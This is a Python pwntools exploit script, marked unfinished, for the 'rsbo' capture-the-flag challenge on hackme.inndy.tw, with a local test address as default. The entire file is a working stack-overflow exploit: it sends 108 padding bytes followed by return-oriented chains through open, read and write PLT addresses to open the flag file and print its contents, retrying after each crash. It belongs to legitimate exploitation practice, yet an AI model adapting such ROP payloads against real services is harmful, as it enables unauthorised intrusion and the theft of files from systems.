# -*- coding: utf-8 -*-
#!/usr/bin/env python
#   Version 
#   Author: WildfootW
#   GitHub: github.com/WildfootW
#   Copyright (C) 2019 WildfootW All rights reserved.
#

# not yet completed

from pwn import *
from my_pwn_tools import *

# my_pwn_tools
fmt = format_s()

def print_payload(payload, message = None):
    if message != None:
        log.info(message)
    payload = str(payload)
    log.info("payload: " + payload)
    log.info("payload length: " + str(len(payload)))

context.arch = "i386"
context.os = "linux"
context.endian = "little"
# ["CRITICAL", "DEBUG", "ERROR", "INFO", "NOTSET", "WARN", "WARNING"]
context.log_level = "DEBUG"
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#r = process("./a.out", env={"LD_PRELOAD" : "./libc.so.6"})
#gdb.attach(r, execute='b main\n')

is_local = True

host = "hackme.inndy.tw"
port = 7706
if is_local:
    host = "127.0.0.1"
    port = 8888

while True:
    r = remote(host, port)
    #r = process("./rsbo")

    input("Attach in gdb and press Enter")

    open_plt = 0x8048420
    read_plt = 0x80483e0
    write_plt = 0x8048450
    flag_path = 0x80487d0
    start_0 = 0x08048490
    file_descript = 0x3
    if is_local:
        file_descript = 0x7
    my_buffer = 0x804a040
    fd_stdout = 0x1
    flag_size = 0x54
    leave_main = 0x08048733

# open
    payload = flat(['\x00' * 108, open_plt, start_0, flag_path, 0x0])
    print_payload(payload)
    r.send(payload)

# read
    payload = flat(['\x00' * 108, read_plt, start_0, file_descript, my_buffer, flag_size])
    print_payload(payload)
    r.send(payload)

# write
    payload = flat(['\x00' * 108, write_plt, leave_main, fd_stdout, my_buffer, flag_size])
    print_payload(payload)
    r.send(payload)

    try:
        flag = r.recvn(flag_size)
        print(flag)
        r.close()
        break;
    except EOFError:
        r.close()
        print("Crash! restart")

